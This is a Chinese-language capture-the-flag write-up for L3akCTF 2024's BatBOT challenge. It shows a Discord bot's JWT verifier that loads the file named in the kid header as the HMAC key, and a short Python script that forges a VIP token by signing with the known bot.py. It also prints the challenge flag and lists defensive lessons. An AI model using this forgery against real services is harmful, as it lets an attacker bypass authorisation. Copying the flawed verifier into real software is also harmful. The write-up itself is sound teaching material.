# L3akCTF 2024 BatBOT Writeup

## 题目简述

题目是一个 Discord Bot，提供 `!generate` 生成普通用户 JWT，并在私聊中通过 `!verify` 验证。只有载荷同时包含用户名和 `role: VIP` 才返回 flag。

JWT 使用 HS256，但验证函数完全信任 token 头部的 `kid`，把它当作当前工作目录中的文件名读取，并将文件全文作为 HMAC 密钥。检查仅禁止 `/`，没有把文件限定为真正的 `secret.txt`。

## 解题过程

正常 token 的头部为：

```json
{
  "alg": "HS256",
  "kid": "secret.txt",
  "typ": "JWT"
}
```

服务端验证逻辑为：

```python
header = jwt.get_unverified_header(token)
kid = header["kid"]
assert "/" not in kid

with open(kid, "r") as file:
    secret_key = file.read().strip()

decoded = jwt.decode(
    token,
    secret_key,
    algorithms=["HS256"],
)
```

虽然不能通过斜杠进行目录穿越，但仍可选择工作目录中任意已知文件。`bot.py` 与服务端同目录，而且题目直接提供了其完整内容，因此可以令：

```json
{
  "kid": "bot.py"
}
```

然后用 `bot.py` 去除首尾空白后的全文作为 HS256 密钥，自行签发 VIP token：

```python
from pathlib import Path

import jwt

key = Path("bot.py").read_text().strip()

token = jwt.encode(
    {
        "username": "solver",
        "role": "VIP",
    },
    key,
    algorithm="HS256",
    headers={
        "kid": "bot.py",
    },
)

print(token)
```

在 Bot 私聊中发送：

```text
!verify <生成的 token>
```

签名会通过，因为服务端同样读取自己的 `bot.py` 作为密钥；载荷中的角色又是 `VIP`，最终返回：

```text
L3ak{N3V3R_L3AK_THE_C0DE!}
```

## 方法总结

- `kid` 只能用来选择服务端预先配置的可信密钥标识，不能直接映射到用户可控文件路径。
- 禁止 `/` 只阻止了最直观的目录穿越，仍未解决“任意同目录文件可充当密钥”的根本问题。
- HS256 的安全性依赖密钥保密；一旦验证端允许选择内容已知的普通文件，攻击者就能合法计算签名，无需破解真正的 secret。
- 分析 JWT 时应同时核对算法白名单、密钥来源和载荷授权判断，不能只检查是否存在 `alg: none`。
